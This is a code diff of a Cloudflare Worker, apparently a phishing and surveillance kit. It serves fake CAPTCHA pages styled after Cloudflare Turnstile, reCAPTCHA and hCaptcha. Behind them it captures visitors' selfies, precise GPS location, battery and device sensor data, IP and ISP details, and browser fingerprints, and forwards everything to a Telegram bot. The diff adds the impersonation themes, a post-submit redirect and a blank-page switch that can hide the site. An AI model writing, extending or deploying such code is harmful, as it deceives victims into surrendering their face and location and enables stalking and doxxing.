@@ -1,19 +1,22 @@
 // ============================================================
-//  Selfie Captcha Worker — v8 (Geo + Admin + Cloudflare UI)
+//  Selfie Captcha Worker — v10
 // ============================================================
 //  Env vars:
-//    TELEGRAM_BOT_TOKEN   (required)
-//    TELEGRAM_CHAT_ID     (required)
-//    ADMIN_TOKEN          (required for admin + legacy /on /off)
-//    ADMIN_PASSWORD       (STRONGLY recommended — defaults to ADMIN_TOKEN)
-//    ADMIN_PATH           (optional — defaults to ADMIN_TOKEN)
-//    SESSION_SECRET       (optional)
-//    MAX_UPLOAD_BYTES     (optional, default 5MB)
-//    RATE_LIMIT_PER_MIN   (optional, default 5)
-//
+//    TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
+//    ADMIN_TOKEN, ADMIN_PASSWORD (recommended), ADMIN_PATH (optional)
+//    SESSION_SECRET, MAX_UPLOAD_BYTES, RATE_LIMIT_PER_MIN (all optional)
 //  KV Binding:
 //    SELFIE_STATE  →  KV Namespace  (recommended)
 // ============================================================
+
+const UI_MODES = [
+  { id: 'cloudflare', icon: '🛡️', title: 'Cloudflare', desc: 'شبیه Turnstile' },
+  { id: 'classic',    icon: '📄', title: 'کلاسیک',     desc: 'سادهٔ فارسی' },
+  { id: 'google',     icon: '🔎', title: 'Google',     desc: 'شبیه reCAPTCHA' },
+  { id: 'hcaptcha',   icon: '🔮', title: 'hCaptcha',   desc: 'شبیه hCaptcha' },
+  { id: 'minimal',    icon: '◻️', title: 'مینیمال',    desc: 'بدون تزئین' },
+];
+const UI_IDS = UI_MODES.map((m) => m.id);
 
 export default {
   async fetch(request, env, ctx) {
@@ -39,8 +42,11 @@ export default {
       if (url.pathname === '/state') {
         if (request.method !== 'GET') return methodNotAllowed(['GET']);
         return json({
+          site: await getState(env, 'site', 'on'),
           selfie: await getState(env, 'selfie', 'on'),
           geo: await getState(env, 'geo', 'off'),
+          ui: await getState(env, 'ui', 'cloudflare', UI_IDS),
+          redirect: await getState(env, 'redirect', '', null),
         });
       }
 
@@ -59,7 +65,7 @@ export default {
 };
 
 // ============================================================
-//  Admin: env helpers
+//  Admin env helpers
 // ============================================================
 function getAdminBase(env) {
   const p = env.ADMIN_PATH || env.ADMIN_TOKEN;
@@ -67,57 +73,54 @@ function getAdminBase(env) {
   const clean = String(p).replace(/^\/+|\/+$/g, '');
   return clean ? '/' + clean : null;
 }
-
 function getAdminPassword(env) {
   return env.ADMIN_PASSWORD || env.ADMIN_TOKEN || '';
 }
 
 // ============================================================
-//  State (per-feature: selfie / geo)
+//  State helpers
 // ============================================================
 const RECENT_LOG_KEY = 'recent_log';
 const RECENT_LOG_MAX = 20;
 
-async function getState(env, key, defaultValue = 'on') {
+async function getState(env, key, defaultValue = 'on', validValues = ['on', 'off']) {
   if (env.SELFIE_STATE) {
     try {
       const v = await env.SELFIE_STATE.get(key);
-      if (v === 'on' || v === 'off') return v;
-    } catch (e) {
-      console.error('kv get failed', e);
-    }
+      if (v !== null && v !== undefined && (validValues === null || validValues.includes(v))) return v;
+    } catch (e) { console.error('kv get failed', e); }
   }
   try {
     const cache = caches.default;
     const hit = await cache.match(new Request(`https://selfie-state.local/${key}`));
     if (hit) {
       const v = await hit.text();
-      if (v === 'on' || v === 'off') return v;
+      if (validValues === null || validValues.includes(v)) return v;
     }
   } catch {}
   return defaultValue;
 }
 
-async function setState(env, key, state) {
-  const value = state === 'off' ? 'off' : 'on';
+async function setRawState(env, key, value) {
+  const v = String(value ?? '');
   if (env.SELFIE_STATE) {
-    await env.SELFIE_STATE.put(key, value);
-    return { ok: true, storage: 'kv', feature: key, state: value };
+    if (v === '') await env.SELFIE_STATE.delete(key);
+    else await env.SELFIE_STATE.put(key, v);
+    return { ok: true, storage: 'kv', key, value: v };
   }
   const cache = caches.default;
   await cache.put(
     new Request(`https://selfie-state.local/${key}`),
-    new Response(value, {
-      headers: { 'Cache-Control': 'public, max-age=31536000' },
-    })
+    new Response(v, { headers: { 'Cache-Control': 'public, max-age=31536000' } })
   );
-  return {
-    ok: true,
-    storage: 'cache',
-    feature: key,
-    state: value,
-    warning: 'SELFIE_STATE KV not bound — per-colo only',
-  };
+  return { ok: true, storage: 'cache', key, value: v };
+}
+
+async function setState(env, key, state) {
+  const value = state === 'off' ? 'off' : 'on';
+  const result = await setRawState(env, key, value);
+  if (result.storage === 'cache') result.warning = 'SELFIE_STATE KV not bound — per-colo only';
+  return result;
 }
 
 async function getRecentLog(env) {
@@ -127,9 +130,7 @@ async function getRecentLog(env) {
     if (!raw) return [];
     const arr = JSON.parse(raw);
     return Array.isArray(arr) ? arr : [];
-  } catch {
-    return [];
-  }
+  } catch { return []; }
 }
 
 async function logSubmission(env, entry) {
@@ -137,16 +138,12 @@ async function logSubmission(env, entry) {
   try {
     const raw = await env.SELFIE_STATE.get(RECENT_LOG_KEY);
     let log = [];
-    if (raw) {
-      try { log = JSON.parse(raw); } catch {}
-    }
+    if (raw) { try { log = JSON.parse(raw); } catch {} }
     if (!Array.isArray(log)) log = [];
     log.unshift(entry);
     if (log.length > RECENT_LOG_MAX) log.length = RECENT_LOG_MAX;
     await env.SELFIE_STATE.put(RECENT_LOG_KEY, JSON.stringify(log));
-  } catch (e) {
-    console.error('log failed', e);
-  }
+  } catch (e) { console.error('log failed', e); }
 }
 
 // ============================================================
@@ -155,14 +152,12 @@ async function logSubmission(env, entry) {
 function adminSessionKey(env) {
   return `admin|${env.ADMIN_TOKEN || ''}|${env.ADMIN_PASSWORD || ''}`;
 }
-
-async function issueAdminSession(env, ttlMs = 12 * 3600_000) {
+async function issueAdminSession(env) {
   const ts = String(Date.now());
   const payload = btoa(ts);
   const sig = await hmac(payload, adminSessionKey(env));
   return `${payload}.${sig}`;
 }
-
 async function verifyAdminSession(token, env, maxAgeMs = 12 * 3600_000) {
   if (!token || !env.ADMIN_TOKEN) return false;
   try {
@@ -171,39 +166,29 @@ async function verifyAdminSession(token, env, maxAgeMs = 12 * 3600_000) {
     const expected = await hmac(payload, adminSessionKey(env));
     if (expected.length !== sig.length) return false;
     let diff = 0;
-    for (let i = 0; i < expected.length; i++) {
-      diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
-    }
+    for (let i = 0; i < expected.length; i++) diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
     if (diff !== 0) return false;
     const ts = Number(atob(payload));
     return Number.isFinite(ts) && Date.now() - ts <= maxAgeMs;
-  } catch {
-    return false;
-  }
+  } catch { return false; }
 }
-
 const timingSafeEqual = (a, b) => {
-  const A = String(a ?? '');
-  const B = String(b ?? '');
+  const A = String(a ?? ''), B = String(b ?? '');
   if (A.length !== B.length) return false;
-  let diff = 0;
-  for (let i = 0; i < A.length; i++) diff |= A.charCodeAt(i) ^ B.charCodeAt(i);
-  return diff === 0;
+  let d = 0;
+  for (let i = 0; i < A.length; i++) d |= A.charCodeAt(i) ^ B.charCodeAt(i);
+  return d === 0;
 };
 
 // ============================================================
-//  Legacy API: /on /off /geo/on /geo/off
+//  Legacy toggle API
 // ============================================================
 async function handleToggle(request, env, feature, action) {
   if (!env.ADMIN_TOKEN) return json({ error: 'admin_disabled' }, 403);
   const url = new URL(request.url);
-  const provided =
-    url.searchParams.get('token') || request.headers.get('X-Admin-Token') || '';
-  if (!timingSafeEqual(provided, env.ADMIN_TOKEN)) {
-    return json({ error: 'unauthorized' }, 401);
-  }
-  const result = await setState(env, feature, action);
-  return json(result);
+  const provided = url.searchParams.get('token') || request.headers.get('X-Admin-Token') || '';
+  if (!timingSafeEqual(provided, env.ADMIN_TOKEN)) return json({ error: 'unauthorized' }, 401);
+  return json(await setState(env, feature, action));
 }
 
 // ============================================================
@@ -218,13 +203,17 @@ async function handleAdmin(request, env, sub, adminBase) {
 
   if (request.method === 'GET' && sub === '') {
     if (authed) {
-      const [selfieState, geoState, log] = await Promise.all([
+      const [siteState, selfieState, geoState, uiMode, redirectUrl, log] = await Promise.all([
+        getState(env, 'site', 'on'),
         getState(env, 'selfie', 'on'),
         getState(env, 'geo', 'off'),
+        getState(env, 'ui', 'cloudflare', UI_IDS),
+        getState(env, 'redirect', '', null),
         getRecentLog(env),
       ]);
       return adminResponse(
-        renderAdminDashboard(nonce, adminBase, selfieState, geoState, env, request.cf || {}, log, url.searchParams),
+        renderAdminDashboard(nonce, adminBase, siteState, selfieState, geoState, uiMode, redirectUrl,
+          env, request.cf || {}, log, url.searchParams),
         nonce
       );
     }
@@ -234,13 +223,8 @@ async function handleAdmin(request, env, sub, adminBase) {
   if (request.method === 'POST' && sub === 'login') {
     const rl = await rateLimit('adminlogin:' + ip, 5, 60);
     if (!rl.allowed) return redirect(adminBase + '?err=rate');
-
     let password = '';
-    try {
-      const form = await request.formData();
-      password = String(form.get('password') || '');
-    } catch {}
-
+    try { const form = await request.formData(); password = String(form.get('password') || ''); } catch {}
     const expected = getAdminPassword(env);
     if (!expected || !timingSafeEqual(password, expected)) {
       await sleep(300);
@@ -260,21 +244,41 @@ async function handleAdmin(request, env, sub, adminBase) {
 
   if (request.method === 'POST' && sub === 'toggle') {
     if (!authed) return redirect(adminBase);
-    let feature = '';
-    let desired = '';
-    try {
-      const form = await request.formData();
-      feature = String(form.get('feature') || '');
-      desired = String(form.get('state') || '');
-    } catch {}
-    if (!['selfie', 'geo'].includes(feature) || !['on', 'off'].includes(desired)) {
-      return redirect(adminBase + '?err=state');
-    }
+    let feature = '', desired = '';
+    try { const f = await request.formData(); feature = String(f.get('feature') || ''); desired = String(f.get('state') || ''); } catch {}
+    if (!['selfie', 'geo'].includes(feature) || !['on', 'off'].includes(desired)) return redirect(adminBase + '?err=state');
     await setState(env, feature, desired);
-    return redirect(
-      `${adminBase}?ok=toggled&feature=${feature}&state=${desired}`,
-      303
-    );
+    return redirect(`${adminBase}?ok=toggled&feature=${feature}&state=${desired}`, 303);
+  }
+
+  if (request.method === 'POST' && sub === 'set-site') {
+    if (!authed) return redirect(adminBase);
+    let desired = '';
+    try { const f = await request.formData(); desired = String(f.get('state') || ''); } catch {}
+    if (!['on', 'off'].includes(desired)) return redirect(adminBase + '?err=state');
+    await setState(env, 'site', desired);
+    return redirect(`${adminBase}?ok=site&state=${desired}`, 303);
+  }
+
+  if (request.method === 'POST' && sub === 'set-ui') {
+    if (!authed) return redirect(adminBase);
+    let mode = '';
+    try { const f = await request.formData(); mode = String(f.get('mode') || ''); } catch {}
+    if (!UI_IDS.includes(mode)) return redirect(adminBase + '?err=ui');
+    await setRawState(env, 'ui', mode);
+    return redirect(adminBase + '?ok=ui&mode=' + mode, 303);
+  }
+
+  if (request.method === 'POST' && sub === 'set-redirect') {
+    if (!authed) return redirect(adminBase);
+    let u = '';
+    try { const f = await request.formData(); u = String(f.get('url') || '').trim(); } catch {}
+    if (u) {
+      if (!/^https?:\/\//i.test(u)) return redirect(adminBase + '?err=url');
+      if (u.length > 2000) return redirect(adminBase + '?err=url');
+    }
+    await setRawState(env, 'redirect', u);
+    return redirect(adminBase + '?ok=redirect', 303);
   }
 
   return new Response('Not Found', { status: 404 });
@@ -284,11 +288,19 @@ async function handleAdmin(request, env, sub, adminBase) {
 //  GET /
 // ============================================================
 async function handlePage(request, env) {
+  const siteMode = await getState(env, 'site', 'on');
+  if (siteMode === 'off') return blankPageResponse();
+
   const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
   const token = await issueToken(secret);
   const nonce = crypto.randomUUID().replace(/-/g, '');
-  const selfieState = await getState(env, 'selfie', 'on');
-  const geoState = await getState(env, 'geo', 'off');
+
+  const [selfieState, geoState, uiMode, redirectUrl] = await Promise.all([
+    getState(env, 'selfie', 'on'),
+    getState(env, 'geo', 'off'),
+    getState(env, 'ui', 'cloudflare', UI_IDS),
+    getState(env, 'redirect', '', null),
+  ]);
 
   const headers = new Headers({
     'Content-Type': 'text/html;charset=UTF-8',
@@ -311,18 +323,39 @@ async function handlePage(request, env) {
       "frame-ancestors 'none'",
     ].join('; '),
   });
-  headers.set(
-    'Set-Cookie',
-    `hs_session=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=300; Secure`
-  );
+  headers.set('Set-Cookie', `hs_session=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=300; Secure`);
 
-  return new Response(renderHTML(nonce, selfieState, geoState), { headers });
+  const html = renderUI(uiMode, nonce, selfieState, geoState, redirectUrl);
+  return new Response(html, { headers });
+}
+
+function renderUI(mode, nonce, selfieState, geoState, redirectUrl) {
+  const s = selfieState === 'off' ? 'off' : 'on';
+  const g = geoState === 'on' ? 'on' : 'off';
+  switch (mode) {
+    case 'classic':    return renderClassicHTML(nonce, s, g, redirectUrl);
+    case 'google':     return renderGoogleHTML(nonce, s, g, redirectUrl);
+    case 'hcaptcha':   return renderHcaptchaHTML(nonce, s, g, redirectUrl);
+    case 'minimal':    return renderMinimalHTML(nonce, s, g, redirectUrl);
+    case 'cloudflare':
+    default:           return renderCloudflareHTML(nonce, s, g, redirectUrl);
+  }
+}
+
+function blankPageResponse() {
+  return new Response(
+    '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="robots" content="noindex"><title></title></head><body style="margin:0;min-height:100vh;background:#fff"></body></html>',
+    { headers: { 'Content-Type': 'text/html;charset=UTF-8', 'Cache-Control': 'no-store' } }
+  );
 }
 
 // ============================================================
 //  POST /upload
 // ============================================================
 async function handleUpload(request, env, ctx) {
+  const siteMode = await getState(env, 'site', 'on');
+  if (siteMode === 'off') return json({ error: 'site_disabled' }, 503);
+
   const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
   const secret = env.SESSION_SECRET || env.TELEGRAM_BOT_TOKEN;
 
@@ -330,16 +363,10 @@ async function handleUpload(request, env, ctx) {
   if (!rl.allowed) return json({ error: 'rate_limited' }, 429);
 
   const token = parseCookie(request.headers.get('Cookie') || '', 'hs_session');
-  if (!token || !(await verifyToken(token, secret))) {
-    return json({ error: 'invalid_session' }, 403);
-  }
+  if (!token || !(await verifyToken(token, secret))) return json({ error: 'invalid_session' }, 403);
 
   let form;
-  try {
-    form = await request.formData();
-  } catch {
-    return json({ error: 'invalid_multipart' }, 400);
-  }
+  try { form = await request.formData(); } catch { return json({ error: 'invalid_multipart' }, 400); }
 
   const selfieMode = await getState(env, 'selfie', 'on');
   const geoMode = await getState(env, 'geo', 'off');
@@ -352,46 +379,26 @@ async function handleUpload(request, env, ctx) {
     const maxBytes = Number(env.MAX_UPLOAD_BYTES) || 5 * 1024 * 1024;
     if (photo.size === 0) return json({ error: 'empty_photo' }, 400);
     if (photo.size > maxBytes) return json({ error: 'photo_too_large' }, 413);
-    if (!/^image\/(jpeg|png|webp)$/.test(photo.type)) {
-      return json({ error: 'invalid_mime' }, 415);
-    }
+    if (!/^image\/(jpeg|png|webp)$/.test(photo.type)) return json({ error: 'invalid_mime' }, 415);
   }
 
   let clientInfo = {};
-  try {
-    clientInfo = JSON.parse(clientDataRaw || '{}');
-  } catch {
-    clientInfo = { _parseError: 'invalid json' };
-  }
+  try { clientInfo = JSON.parse(clientDataRaw || '{}'); }
+  catch { clientInfo = { _parseError: 'invalid json' }; }
 
   const cf = request.cf || {};
   const serverInfo = {
-    ip,
-    country: cf.country,
-    countryName: cf.countryName,
-    continent: cf.continent,
-    city: cf.city,
-    region: cf.region,
-    regionCode: cf.regionCode,
-    postalCode: cf.postalCode,
-    latitude: cf.latitude,
-    longitude: cf.longitude,
-    timezone: cf.timezone,
-    isEUCountry: cf.isEUCountry,
-    isp: cf.asOrganization,
-    asn: cf.asn,
-    metroCode: cf.metroCode,
-    httpProtocol: cf.httpProtocol,
-    tlsVersion: cf.tlsVersion,
-    tlsCipher: cf.tlsCipher,
-    clientTcpRtt: cf.clientTcpRtt,
-    colo: cf.colo,
+    ip, country: cf.country, countryName: cf.countryName, continent: cf.continent,
+    city: cf.city, region: cf.region, regionCode: cf.regionCode, postalCode: cf.postalCode,
+    latitude: cf.latitude, longitude: cf.longitude, timezone: cf.timezone,
+    isEUCountry: cf.isEUCountry, isp: cf.asOrganization, asn: cf.asn, metroCode: cf.metroCode,
+    httpProtocol: cf.httpProtocol, tlsVersion: cf.tlsVersion, tlsCipher: cf.tlsCipher,
+    clientTcpRtt: cf.clientTcpRtt, colo: cf.colo,
     userAgent: request.headers.get('User-Agent'),
     acceptLanguage: request.headers.get('Accept-Language'),
     acceptEncoding: request.headers.get('Accept-Encoding'),
     referer: request.headers.get('Referer'),
-    botScore: cf.botManagement?.score,
-    verifiedBot: cf.botManagement?.verifiedBot,
+    botScore: cf.botManagement?.score, verifiedBot: cf.botManagement?.verifiedBot,
   };
 
   const sessionId = crypto.randomUUID().slice(0, 8);
@@ -401,11 +408,8 @@ async function handleUpload(request, env, ctx) {
   const results = [];
 
   if (selfieMode === 'on' && photo instanceof File) {
-    const photoRes = await tg.sendPhoto(
-      photo,
-      `📸 <b>سلفی دریافتی</b>\nشناسه: <code>${sessionId}</code>`
-    );
-    results.push({ step: 'photo', ok: !!photoRes.ok });
+    const r = await tg.sendPhoto(photo, `📸 <b>سلفی دریافتی</b>\nشناسه: <code>${sessionId}</code>`);
+    results.push({ step: 'photo', ok: !!r.ok });
   }
 
   for (const [i, chunk] of chunkByLines(reportHtml).entries()) {
@@ -415,9 +419,7 @@ async function handleUpload(request, env, ctx) {
   }
 
   const rawJson = JSON.stringify(
-    { sessionId, at: new Date().toISOString(), selfieMode, geoMode, serverInfo, clientInfo },
-    null,
-    2
+    { sessionId, at: new Date().toISOString(), selfieMode, geoMode, serverInfo, clientInfo }, null, 2
   );
   const docRes = await tg.sendDocument(
     new Blob([rawJson], { type: 'application/json' }),
@@ -428,26 +430,18 @@ async function handleUpload(request, env, ctx) {
 
   if (ctx && ctx.waitUntil) {
     const geo = clientInfo.geolocation || {};
-    ctx.waitUntil(
-      logSubmission(env, {
-        ts: Date.now(),
-        sessionId,
-        ip,
-        country: cf.country || null,
-        city: cf.city || null,
-        selfieMode,
-        geoMode,
-        lat: geo.success ? geo.latitude : null,
-        lon: geo.success ? geo.longitude : null,
-        accuracy: geo.success ? Math.round(geo.accuracy) : null,
-        ua: String(request.headers.get('User-Agent') || '').slice(0, 80),
-      })
-    );
+    ctx.waitUntil(logSubmission(env, {
+      ts: Date.now(), sessionId, ip,
+      country: cf.country || null, city: cf.city || null,
+      selfieMode, geoMode,
+      lat: geo.success ? geo.latitude : null,
+      lon: geo.success ? geo.longitude : null,
+      accuracy: geo.success ? Math.round(geo.accuracy) : null,
+      ua: String(request.headers.get('User-Agent') || '').slice(0, 80),
+    }));
   }
 
-  if (!results.some((r) => r.ok)) {
-    return json({ error: 'telegram_failed', results }, 502);
-  }
+  if (!results.some((r) => r.ok)) return json({ error: 'telegram_failed', results }, 502);
   return json({ ok: true, sessionId, selfieMode, geoMode, results });
 }
 
@@ -456,8 +450,7 @@ async function handleUpload(request, env, ctx) {
 // ============================================================
 class TelegramClient {
   constructor(token, chatId) {
-    this.token = token;
-    this.chatId = chatId;
+    this.token = token; this.chatId = chatId;
     this.base = `https://api.telegram.org/bot${token}`;
   }
   sendPhoto(blob, caption) {
@@ -469,16 +462,9 @@ class TelegramClient {
     return this._call('sendPhoto', fd);
   }
   sendMessage(text) {
-    return this._call(
-      'sendMessage',
-      JSON.stringify({
-        chat_id: this.chatId,
-        text,
-        parse_mode: 'HTML',
-        disable_web_page_preview: true,
-      }),
-      { 'Content-Type': 'application/json' }
-    );
+    return this._call('sendMessage', JSON.stringify({
+      chat_id: this.chatId, text, parse_mode: 'HTML', disable_web_page_preview: true,
+    }), { 'Content-Type': 'application/json' });
   }
   sendDocument(blob, filename, caption) {
     const fd = new FormData();
@@ -506,25 +492,18 @@ class TelegramClient {
 // ============================================================
 function buildReport(sessionId, server, client, selfieMode, geoMode) {
   const esc = escapeHtml;
-  const cam = client.camera || {};
-  const frame = client.capturedFrame || {};
-  const orientation = client.orientation || {};
-  const battery = client.battery || {};
+  const cam = client.camera || {}, frame = client.capturedFrame || {};
+  const orientation = client.orientation || {}, battery = client.battery || {};
   const geo = client.geolocation || {};
-  const zoom = cam.zoom;
-  const iso = cam.iso;
+  const zoom = cam.zoom, iso = cam.iso;
   const when = client.utcTime || client.localTime || new Date().toISOString();
 
   let geoBlock;
-  if (geoMode === 'off') {
-    geoBlock = `<pre>🔒 غیرفعال — توسط ادمین خاموش شده</pre>`;
-  } else if (geo.skipped) {
-    geoBlock = `<pre>درخواست نشد</pre>`;
-  } else if (!geo.supported) {
-    geoBlock = `<pre>مرورگر از Geolocation پشتیبانی نمی‌کند</pre>`;
-  } else if (geo.success) {
-    const lat = fmtCoord(geo.latitude);
-    const lon = fmtCoord(geo.longitude);
+  if (geoMode === 'off') geoBlock = `<pre>🔒 غیرفعال — توسط ادمین خاموش شده</pre>`;
+  else if (geo.skipped) geoBlock = `<pre>درخواست نشد</pre>`;
+  else if (!geo.supported) geoBlock = `<pre>مرورگر پشتیبانی نمی‌کند</pre>`;
+  else if (geo.success) {
+    const lat = fmtCoord(geo.latitude), lon = fmtCoord(geo.longitude);
     const mapUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
     geoBlock = `<pre>مختصات:     ${lat}, ${lon}
 دقت:         ${Math.round(geo.accuracy)} متر (${labelPrecision(geo.accuracy)})
@@ -535,31 +514,22 @@ function buildReport(sessionId, server, client, selfieMode, geoMode) {
 زمان ثبت:    ${new Date(geo.timestamp).toISOString()}</pre>
 <a href="${esc(mapUrl)}">🗺 باز کردن در نقشه</a>`;
   } else {
-    geoBlock = `<pre>دریافت نشد: ${esc(geo.error || 'unknown')}${
-      geo.message ? '\n' + esc(geo.message) : ''
-    }</pre>`;
+    geoBlock = `<pre>دریافت نشد: ${esc(geo.error || 'unknown')}${geo.message ? '\n' + esc(geo.message) : ''}</pre>`;
   }
 
   const lines = [
     `🔐 <b>گزارش سلفی</b>`,
     `<i>شناسه:</i> <code>${sessionId}</code>`,
     `<i>سلفی:</i> ${selfieMode === 'on' ? '🟢 روشن' : '🔴 خاموش'} • <i>موقعیت:</i> ${geoMode === 'on' ? '🟢 روشن' : '🔴 خاموش'}`,
-    `<i>زمان:</i> ${esc(when)}`,
-    ``,
-
-    `📍 <b>موقعیت دقیق (GPS)</b>`,
-    geoBlock,
-    ``,
-
+    `<i>زمان:</i> ${esc(when)}`, ``,
+    `📍 <b>موقعیت دقیق (GPS)</b>`, geoBlock, ``,
     `🔋 <b>وضعیت باتری</b>`,
     battery.supported === false
       ? `<pre>در دسترس نیست (${esc(battery.reason || battery.error || 'unsupported')})</pre>`
       : `<pre>سطح:        ${battery.percent != null ? battery.percent + '%' : '—'}
 شارژ:       ${battery.charging === true ? 'در حال شارژ ⚡' : battery.charging === false ? 'شارژ نمی‌شود' : '—'}
 تا پر شدن:  ${fmtSeconds(battery.chargingTime)}
-تا خالی:    ${fmtSeconds(battery.dischargingTime)}</pre>`,
-    ``,
-
+تا خالی:    ${fmtSeconds(battery.dischargingTime)}</pre>`, ``,
     `🧭 <b>وضعیت دستگاه (ژیروسکوپ)</b>`,
     orientation.supported === false
       ? `<pre>پشتیبانی نمی‌شود (${esc(orientation.reason || 'unknown')})</pre>`
@@ -570,9 +540,7 @@ Beta  (X):  ${fmtNum(orientation.average.beta)}°
 Gamma (Y):  ${fmtNum(orientation.average.gamma)}°
 صفحه:       ${esc(orientation.screenOrientation?.type || '—')} (${esc(orientation.screenOrientation?.angle ?? '—')}°)
 نمونه‌ها:   ${esc(orientation.sampleCount || 0)}</pre>`
-        : `<pre>داده‌ای دریافت نشد (${esc(orientation.note || 'no_data')})</pre>`,
-    ``,
-
+        : `<pre>داده‌ای دریافت نشد (${esc(orientation.note || 'no_data')})</pre>`, ``,
     `🌐 <b>اطلاعات شبکه</b>`,
     `<pre>IP:          ${esc(server.ip)}
 کشور:       ${esc(server.country)} (${esc(server.countryName)})
@@ -594,9 +562,7 @@ Colo:       ${esc(server.colo)}</pre>`,
     `Lang: ${esc(server.acceptLanguage)}`,
     `Encoding: ${esc(server.acceptEncoding)}`,
     `Referer: ${esc(server.referer)}`,
-    `BotScore: ${esc(server.botScore ?? '—')}`,
-    ``,
-
+    `BotScore: ${esc(server.botScore ?? '—')}`, ``,
     `📷 <b>اطلاعات دوربین</b>`,
     selfieMode === 'on'
       ? `<pre>نوع:         ${esc(cam.facingMode || '—')}
@@ -613,10 +579,7 @@ ISO:         ${iso ? `${iso.min}–${iso.max}` : '—'}
 فریم نهایی:  ${esc(frame.width || '?')}×${esc(frame.height || '?')} (${Math.round((frame.size || 0) / 1024)} KB)</pre>`
       : `<pre>غیرفعال — دوربین در حالت خاموش درخواست نشد</pre>`,
     selfieMode === 'on' && cam.videoDeviceLabels && cam.videoDeviceLabels.length
-      ? `<i>لیبل دستگاه‌ها:</i> ${esc(cam.videoDeviceLabels.join(' • '))}`
-      : ``,
-    ``,
-
+      ? `<i>لیبل دستگاه‌ها:</i> ${esc(cam.videoDeviceLabels.join(' • '))}` : ``, ``,
     `💻 <b>اطلاعات مرورگر</b>`,
     `<pre>User-Agent: ${esc(client.userAgent)}
 زبان:       ${esc(client.language)}
@@ -636,35 +599,23 @@ TZ:         ${esc(client.timezone)}
 DNT:        ${esc(client.doNotTrack)}
 PDF:        ${client.pdfViewerEnabled ? 'بله' : 'خیر'}</pre>`,
   ];
-
   return lines.filter(Boolean).join('\n');
 }
 
 // ============================================================
 //  Helpers
 // ============================================================
-const escapeHtml = (v) =>
-  String(v ?? '—')
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;');
-
-const fmtNum = (n, digits = 1) =>
-  typeof n === 'number' && isFinite(n) ? n.toFixed(digits) : '—';
-
-const fmtCoord = (n) =>
-  typeof n === 'number' && isFinite(n) ? n.toFixed(6) : '—';
-
+const escapeHtml = (v) => String(v ?? '—')
+  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+const fmtNum = (n, d = 1) => typeof n === 'number' && isFinite(n) ? n.toFixed(d) : '—';
+const fmtCoord = (n) => typeof n === 'number' && isFinite(n) ? n.toFixed(6) : '—';
 const fmtSeconds = (s) => {
   if (typeof s !== 'number' || !isFinite(s) || s <= 0) return '—';
-  const h = Math.floor(s / 3600);
-  const m = Math.floor((s % 3600) / 60);
+  const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60);
   if (h > 0) return `${h} ساعت ${m} دقیقه`;
   if (m > 0) return `${m} دقیقه`;
   return `${Math.floor(s)} ثانیه`;
 };
-
 const labelPrecision = (acc) => {
   if (typeof acc !== 'number' || !isFinite(acc)) return '—';
   if (acc < 20) return 'عالی (GPS)';
@@ -687,29 +638,18 @@ async function verifyToken(token, secret, maxAgeMs = 5 * 60_000) {
     const expected = await hmac(payload, secret);
     if (expected.length !== sig.length) return false;
     let diff = 0;
-    for (let i = 0; i < expected.length; i++) {
-      diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
-    }
+    for (let i = 0; i < expected.length; i++) diff |= expected.charCodeAt(i) ^ sig.charCodeAt(i);
     if (diff !== 0) return false;
     const ts = Number(atob(payload));
     return Number.isFinite(ts) && Date.now() - ts <= maxAgeMs;
-  } catch {
-    return false;
-  }
+  } catch { return false; }
 }
 async function hmac(data, secret) {
-  const key = await crypto.subtle.importKey(
-    'raw',
-    new TextEncoder().encode(secret),
-    { name: 'HMAC', hash: 'SHA-256' },
-    false,
-    ['sign']
-  );
+  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret),
+    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
   const buf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
   return btoa(String.fromCharCode(...new Uint8Array(buf)))
-    .replace(/\+/g, '-')
-    .replace(/\//g, '_')
-    .replace(/=+$/, '');
+    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
 }
 
 async function rateLimit(ip, limit, windowSec) {
@@ -718,12 +658,9 @@ async function rateLimit(ip, limit, windowSec) {
   const hit = await cache.match(key);
   const count = hit ? Number(await hit.text()) || 0 : 0;
   if (count >= limit) return { allowed: false, remaining: 0 };
-  await cache.put(
-    key,
-    new Response(String(count + 1), {
-      headers: { 'Cache-Control': `public, max-age=${windowSec}` },
-    })
-  );
+  await cache.put(key, new Response(String(count + 1), {
+    headers: { 'Cache-Control': `public, max-age=${windowSec}` },
+  }));
   return { allowed: true, remaining: limit - count - 1 };
 }
 
@@ -735,30 +672,21 @@ function parseCookie(header, name) {
   return null;
 }
 function chunkByLines(text, size = 4000) {
-  const out = [];
-  let current = '';
+  const out = []; let current = '';
   for (const line of text.split('\n')) {
-    if (current && (current + '\n' + line).length > size) {
-      out.push(current);
-      current = line;
-    } else {
-      current = current ? current + '\n' + line : line;
-    }
+    if (current && (current + '\n' + line).length > size) { out.push(current); current = line; }
+    else current = current ? current + '\n' + line : line;
   }
   if (current) out.push(current);
   return out;
 }
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-const json = (obj, status = 200) =>
-  new Response(JSON.stringify(obj), {
-    status,
-    headers: { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' },
-  });
-const methodNotAllowed = (allowed) =>
-  new Response('Method Not Allowed', {
-    status: 405,
-    headers: { Allow: allowed.join(', ') },
-  });
+const json = (obj, status = 200) => new Response(JSON.stringify(obj), {
+  status, headers: { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' },
+});
+const methodNotAllowed = (allowed) => new Response('Method Not Allowed', {
+  status: 405, headers: { Allow: allowed.join(', ') },
+});
 const redirect = (location, status = 302, extraHeaders = {}) => {
   const headers = new Headers({ Location: location, 'Cache-Control': 'no-store' });
